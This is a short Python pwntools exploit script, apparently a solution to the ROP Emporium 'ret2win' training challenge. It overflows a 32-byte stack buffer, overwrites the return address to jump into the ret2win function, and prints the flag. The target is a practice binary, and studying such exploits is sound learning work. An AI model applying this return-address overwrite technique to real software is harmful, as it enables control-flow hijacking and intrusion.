from pwn import *

elf = ELF("ret2win")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x6d
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 56

def main():
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    rop.raw(elf.symbols.ret2win + 0xe)
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
